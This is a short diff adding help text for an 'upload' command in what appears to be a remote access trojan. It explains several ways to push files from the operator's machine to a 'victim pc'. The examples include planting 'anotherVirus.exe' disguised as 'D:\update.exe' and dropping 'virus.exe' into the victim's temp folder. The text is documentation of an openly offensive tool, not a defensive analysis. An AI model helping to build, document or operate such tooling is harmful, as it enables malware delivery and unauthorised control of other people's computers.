@@ -1,0 +1,19 @@
+  Usage : Uploads any file from this pc to victim pc
+
+Down below are differnt variants by which you can call this command	
+
+	1) upload localFilePath (Absolute)
+		Example : upload C:\anotherVirus.exe
+	2) upload localFilePath (Relative)
+		Example : upload anotherVirus.exe
+	3) upload localFilePath remoteFilePath
+		Example : upload C:\anotherVirus.exe D:\update.exe
+	4) upload localpath=localFilePath remotepath=remoteFilePath
+		Example : upload localpath=C:\anotherVirus.exe remotePath=D:\update.exe
+	5) Add temp keyword to upload file in victim's temp folder. Note: this keyword is optional
+		Example: upload localFile.txt temp
+			 upload virus.exe temp
+
+  Note : if remote path is specified then file will be uploaded there. Otherwise file will be uploaded in current working directory
+	 But if temp is specified remote path will be ignored. 
+	temp (optional) to store as a temp file
